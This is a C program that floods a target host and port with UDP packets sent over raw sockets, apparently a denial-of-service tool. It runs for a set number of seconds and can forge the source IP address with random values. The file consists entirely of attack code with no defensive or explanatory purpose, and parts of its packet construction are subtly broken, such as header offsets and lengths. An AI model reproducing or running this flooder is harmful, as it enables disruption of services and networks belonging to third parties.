#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <linux/udp.h>
#include <sys/socket.h>
#include <netinet/ip.h>
uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)
{
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    int length = len;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}
uint16_t checksum_generic(uint16_t *addr, uint32_t count)
{
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}
in_addr_t util_local_addr(void)
{
    int fd = 0;
    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    if((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        return 0;
    }

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("8.8.8.8");
    addr.sin_port = htons(53);

    connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));

    getsockname(fd, (struct sockaddr *)&addr, &addr_len);
    close(fd);

    return addr.sin_addr.s_addr;
}
char host[64];
char *rand_host() {
    int classes[4] = {
        rand() % 256,
        rand() % 256,
        rand() % 256,
        rand() % 256,
    };
    sprintf(host, "%d.%d.%d.%d", classes[0], classes[1], classes[2], classes[3]);
    return host;
}
void init_ip_headers(struct iphdr *iph, char *rdbuf, char *dhost, int spoof, int protocol) {
    if(spoof == 1) {
        iph->saddr = inet_addr(rand_host());
    }
    else {
        iph->saddr = util_local_addr();
    }
    iph->daddr = inet_addr(host);
    iph->ttl = 64;
    iph->version = 4;
    iph->protocol = IPPROTO_UDP;
    iph->ihl = 5;
    iph->id = rand();
    iph->tot_len = sizeof(rdbuf) + sizeof(struct iphdr) + sizeof(struct udphdr);
    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, sizeof (struct iphdr));

}
void init_udp_headers(struct iphdr *iph, struct udphdr *udph, int dport, int psize) {
    udph->len = psize;
    udph->source = htons(rand() % 65536);
    udph->dest = htons(dport);
    udph->check = 0;
    udph->check = checksum_tcpudp(iph, udph, htons(sizeof (struct udphdr)), sizeof (struct udphdr));
}

void flood(char *host, int port, int seconds, int psize, int spoof) {
    srand(time(NULL) ^ getpid());
    char rdbuf[4096];

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP), start = time(NULL);
    psize = psize + rand() % 512;

    struct sockaddr_in addr;
    struct iphdr *iph = (struct iphdr *)rdbuf;
    struct udphdr *udph = (struct udphdr *) (rdbuf + 1);

    addr.sin_addr.s_addr = inet_addr(host);
    addr.sin_port = htons(port);
    addr.sin_family = AF_INET;

    init_ip_headers(iph, rdbuf, host, spoof, IPPROTO_UDP);
    init_udp_headers(iph, udph, port, psize);

    while(time(NULL) < start + seconds) {
        sendto(sock, rdbuf, psize, 0, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    }
}
int main(int argc, char **argv) {
    flood(argv[1], atoi(argv[2]), atoi(argv[3]), atoi(argv[4]), atoi(argv[5]));
}